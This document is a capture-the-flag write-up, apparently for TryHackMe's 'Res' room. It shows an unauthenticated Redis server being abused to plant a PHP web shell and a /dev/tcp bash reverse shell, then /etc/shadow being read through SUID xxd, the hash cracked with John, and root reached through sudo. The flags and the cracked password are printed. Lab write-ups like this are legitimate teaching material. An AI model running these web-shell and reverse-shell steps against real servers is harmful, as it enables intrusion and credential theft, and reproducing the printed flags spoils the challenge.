---
Hack into a vulnerable database server with an in-memory data-structure in this semi-guided challenge!
---

![](https://assets.tryhackme.com/room-banners/redis.png)

```
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sC -sV -T4 -A -Pn -sS -n -O -p- 10.10.252.133
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-26 23:10 EDT
Nmap scan report for 10.10.252.133
Host is up (0.19s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
6379/tcp open  redis   Redis key-value store 6.0.7
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=9/26%OT=80%CT=1%CU=41225%PV=Y%DS=2%DC=T%G=Y%TM=63326C1
OS:E%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=104%TI=Z%CI=I%II=I%TS=8)OPS
OS:(O1=M505ST11NW7%O2=M505ST11NW7%O3=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST1
OS:1NW7%O6=M505ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN
OS:(R=Y%DF=Y%T=40%W=6903%O=M505NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)

Network Distance: 2 hops

TRACEROUTE (using port 5900/tcp)
HOP RTT       ADDRESS
1   186.16 ms 10.11.0.1
2   186.43 ms 10.10.252.133

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 609.19 seconds
zsh: segmentation fault  sudo nmap -sC -sV -T4 -A -Pn -sS -n -O -p- 10.10.252.133

https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis


┌──(kali㉿kali)-[~]
└─$ redis-cli -h 10.10.252.133           
10.10.252.133:6379> info
# Server
redis_version:6.0.7
redis_git_sha1:00000000
redis_git_dirty:0
redis_build_id:5c906d046e45ec07
redis_mode:standalone
os:Linux 4.4.0-189-generic x86_64
arch_bits:64
multiplexing_api:epoll
atomicvar_api:atomic-builtin
gcc_version:5.4.0
process_id:575
run_id:169d781728baf2c6b1371c7f3582c2e935afceba
tcp_port:6379
uptime_in_seconds:1829
uptime_in_days:0
hz:10
configured_hz:10
lru_clock:3305072
executable:/home/vianka/redis-stable/src/redis-server
config_file:/home/vianka/redis-stable/redis.conf
io_threads_active:0

# Clients
connected_clients:1
client_recent_max_input_buffer:4
client_recent_max_output_buffer:0
blocked_clients:0
tracking_clients:0
clients_in_timeout_table:0

# Memory
used_memory:588008
used_memory_human:574.23K
used_memory_rss:4853760
used_memory_rss_human:4.63M
used_memory_peak:588008
used_memory_peak_human:574.23K
used_memory_peak_perc:100.00%
used_memory_overhead:541522
used_memory_startup:524536
used_memory_dataset:46486
used_memory_dataset_perc:73.24%
allocator_allocated:842760
allocator_active:1159168
allocator_resident:3444736
total_system_memory:1038393344
total_system_memory_human:990.29M
used_memory_lua:37888
used_memory_lua_human:37.00K
used_memory_scripts:0
used_memory_scripts_human:0B
number_of_cached_scripts:0
maxmemory:0
maxmemory_human:0B
maxmemory_policy:noeviction
allocator_frag_ratio:1.38
allocator_frag_bytes:316408
allocator_rss_ratio:2.97
allocator_rss_bytes:2285568
rss_overhead_ratio:1.41
rss_overhead_bytes:1409024
mem_fragmentation_ratio:8.90
mem_fragmentation_bytes:4308264
mem_not_counted_for_evict:0
mem_replication_backlog:0
mem_clients_slaves:0
mem_clients_normal:16986
mem_aof_buffer:0
mem_allocator:jemalloc-5.1.0
active_defrag_running:0
lazyfree_pending_objects:0

# Persistence
loading:0
rdb_changes_since_last_save:0
rdb_bgsave_in_progress:0
rdb_last_save_time:1664247627
rdb_last_bgsave_status:ok
rdb_last_bgsave_time_sec:-1
rdb_current_bgsave_time_sec:-1
rdb_last_cow_size:0
aof_enabled:0
aof_rewrite_in_progress:0
aof_rewrite_scheduled:0
aof_last_rewrite_time_sec:-1
aof_current_rewrite_time_sec:-1
aof_last_bgrewrite_status:ok
aof_last_write_status:ok
aof_last_cow_size:0
module_fork_in_progress:0
module_fork_last_cow_size:0

# Stats
total_connections_received:2
total_commands_processed:3
instantaneous_ops_per_sec:0
total_net_input_bytes:72
total_net_output_bytes:22376
instantaneous_input_kbps:0.00
instantaneous_output_kbps:0.00
rejected_connections:0
sync_full:0
sync_partial_ok:0
sync_partial_err:0
expired_keys:0
expired_stale_perc:0.00
expired_time_cap_reached_count:0
expire_cycle_cpu_milliseconds:34
evicted_keys:0
keyspace_hits:0
keyspace_misses:0
pubsub_channels:0
pubsub_patterns:0
latest_fork_usec:0
migrate_cached_sockets:0
slave_expires_tracked_keys:0
active_defrag_hits:0
active_defrag_misses:0
active_defrag_key_hits:0
active_defrag_key_misses:0
tracking_total_keys:0
tracking_total_items:0
tracking_total_prefixes:0
unexpected_error_replies:0
total_reads_processed:5
total_writes_processed:3
io_threaded_reads_processed:0
io_threaded_writes_processed:0

# Replication
role:master
connected_slaves:0
master_replid:e6290222407722e785d236ad6efc12e2603a22e3
master_replid2:0000000000000000000000000000000000000000
master_repl_offset:0
second_repl_offset:-1
repl_backlog_active:0
repl_backlog_size:1048576
repl_backlog_first_byte_offset:0
repl_backlog_histlen:0

# CPU
used_cpu_sys:1.028000
used_cpu_user:1.092000
used_cpu_sys_children:0.000000
used_cpu_user_children:0.000000

# Modules

# Cluster
cluster_enabled:0

# Keyspace

From the above we can see that we have a potential username: vianka. From the Hack Tricks website we can see that we can gain RCE as follows:

To achieve RCE we need to know the web directory, so we can initially assume that it will be /var/www/html.

Using the above as a POC, we can try writing our RCE:


10.10.252.133:6379> config set dir /var/www/html
OK
10.10.252.133:6379> config set dbfilename redis.php
OK
10.10.252.133:6379> set test "<?php phpinfo(); ?>"
OK
10.10.252.133:6379> save
OK


going to http://10.10.252.133/redis.php

We can see that redis.php does indeed run phpinfo().

Let’s try this with another php script to run commands:

<? php system($_GET['cmd']); ?>

In redis-cli, we can simply overwrite the previous php file with this code and try RCE.

10.10.252.133:6379> config set dir /var/www/html
OK
10.10.252.133:6379> set test "<?php system($_GET['cmd']); ?>"
OK
10.10.252.133:6379> save
OK

Let’s see if we can print out the contents of the passwd file on the Linux machine, it is best to change to ‘view-source’ to see the output:

yep

view-source:http://10.10.252.133/redis.php?cmd=%20cat%20/etc/passwd

vianka:x:1000:1000:Res,,,:/home/vianka:/bin/bash


And there we go, we have the full contents of the /etc/passwd file on the screen and again we can see that we have a user vianka. All we need to do now is setup a listener and create a script to run a simple reverse php shell.

To do this I will do the same as above in redis-cli, but we will set test to run the following php reverse shell script.

"<?php exec("/bin/bash -c 'bash -i > /dev/tcp/YOUR_IP/4444 0>&1'"); ?>"

One important point here is that we will need to escape the set test “….” quotes from the php shell script, so we will need to modify our shell code as follows:


10.10.252.133:6379> config set dir /var/www/html
OK
10.10.252.133:6379> config set dbfilename shell.php
OK
10.10.252.133:6379> set test "<?php exec(\"/bin/bash -c 'bash -i > /dev/tcp/10.11.81.220/1337 0>&1'\"); ?>"
OK
10.10.252.133:6379> save
OK
    
                                                                                                    
┌──(kali㉿kali)-[~/Downloads/share]
└─$ rlwrap nc -nlvp 1337 
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::1337
Ncat: Listening on 0.0.0.0:1337
Ncat: Connection from 10.10.252.133.
Ncat: Connection from 10.10.252.133:56556.
whoami
www-data
python3 -c "import pty;pty.spawn('/bin/bash')"
www-data@ubuntu:/var/www/html$ cd /home
cd /home
www-data@ubuntu:/home$ ls
ls
vianka
www-data@ubuntu:/home$ cd vianka
cd vianka
www-data@ubuntu:/home/vianka$ ls
ls
redis-stable  user.txt
www-data@ubuntu:/home/vianka$ cat user.txt
cat user.txt
thm{red1s_rce_w1thout_credent1als}

looking for suid

www-data@ubuntu:/home/vianka$ find / -perm -4000 2>/dev/null
find / -perm -4000 2>/dev/null
/bin/ping
/bin/fusermount
/bin/mount
/bin/su
/bin/ping6
/bin/umount
/usr/bin/chfn
/usr/bin/xxd
/usr/bin/newgrp
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/chsh
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper

gtofbins xxd

https://gtfobins.github.io/gtfobins/xxd/

let's see /etc/shadow

www-data@ubuntu:/home/vianka$ xxd "/etc/shadow" | xxd -r
xxd "/etc/shadow" | xxd -r
root:!:18507:0:99999:7:::
daemon:*:17953:0:99999:7:::
bin:*:17953:0:99999:7:::
sys:*:17953:0:99999:7:::
sync:*:17953:0:99999:7:::
games:*:17953:0:99999:7:::
man:*:17953:0:99999:7:::
lp:*:17953:0:99999:7:::
mail:*:17953:0:99999:7:::
news:*:17953:0:99999:7:::
uucp:*:17953:0:99999:7:::
proxy:*:17953:0:99999:7:::
www-data:*:17953:0:99999:7:::
backup:*:17953:0:99999:7:::
list:*:17953:0:99999:7:::
irc:*:17953:0:99999:7:::
gnats:*:17953:0:99999:7:::
nobody:*:17953:0:99999:7:::
systemd-timesync:*:17953:0:99999:7:::
systemd-network:*:17953:0:99999:7:::
systemd-resolve:*:17953:0:99999:7:::
systemd-bus-proxy:*:17953:0:99999:7:::
syslog:*:17953:0:99999:7:::
_apt:*:17953:0:99999:7:::
messagebus:*:18506:0:99999:7:::
uuidd:*:18506:0:99999:7:::
vianka:$6$2p.tSTds$qWQfsXwXOAxGJUBuq2RFXqlKiql3jxlwEWZP6CWXm7kIbzR6WzlxHR.UHmi.hc1/TuUOUBo/jWQaQtGSXwvri0:18507:0:99999:7:::


www-data@ubuntu:/home/vianka$ xxd "/etc/passwd" | xxd -r
xxd "/etc/passwd" | xxd -r
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
messagebus:x:106:110::/var/run/dbus:/bin/false
uuidd:x:107:111::/run/uuidd:/bin/false
vianka:x:1000:1000:Res,,,:/home/vianka:/bin/bash


johnripper 

To do this we need to create two files, one with the contents of the passwd file and one with the hash of the shadow file, we only need to copy and paste the information for user Vianka. We can then use the ‘unshadow’ command to convert the hash to a format that is readable by John.

unshadow passwd.txt shadow.txt > hash.txt


┌──(kali㉿kali)-[~]
└─$ mkdir res      
                                                                                                    
┌──(kali㉿kali)-[~]
└─$ cd res                 
                                                                                                    
┌──(kali㉿kali)-[~/res]
└─$ nano passwd.txt                                                  
                                                                                                    
┌──(kali㉿kali)-[~/res]
└─$ nano shadow.txt
                                                                                                    
┌──(kali㉿kali)-[~/res]
└─$ unshadow passwd.txt shadow.txt > hash.txt                   
                                                                                                    
┌──(kali㉿kali)-[~/res]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt   
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
beautiful1       (vianka)     
1g 0:00:00:00 DONE (2022-09-27 00:01) 1.234g/s 1580p/s 1580c/s 1580C/s kucing..poohbear1
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 


su

vianka:beautiful1

www-data@ubuntu:/home/vianka$ su vianka
su vianka
Password: beautiful1

vianka@ubuntu:~$ sudo -l
sudo -l
[sudo] password for vianka: beautiful1

Matching Defaults entries for vianka on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User vianka may run the following commands on ubuntu:
    (ALL : ALL) ALL


vianka@ubuntu:~$ sudo -l
sudo -l
[sudo] password for vianka: beautiful1

Matching Defaults entries for vianka on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User vianka may run the following commands on ubuntu:
    (ALL : ALL) ALL

so just sudo su will be root

vianka@ubuntu:~$ sudo su
sudo su
root@ubuntu:/home/vianka# cd /root
cd /root
root@ubuntu:~# ls
ls
root.txt
root@ubuntu:~# tac root.txt
tac root.txt
thm{xxd_pr1v_escalat1on}



```

![](https://miro.medium.com/max/720/1*e8fK3nV_YPwP_185WZI5Dg.png)

![[Pasted image 20220926223435.png]]

Scan the machine, how many ports are open?
*2*

What's is the database management system installed on the server?
*redis*
What port is the database management system running on?
*6379*
What's is the version of management system installed on the server?redis-cli
*6.0.7*

Compromise the machine and locate user.txt

What directory can you write to? Apache?
*thm{red1s_rce_w1thout_credent1als}*


What is the local user account password?
*beautiful1*

Escalate privileges and obtain root.txt
*thm{xxd_pr1v_escalat1on}*


[[Phishing Emails 5]]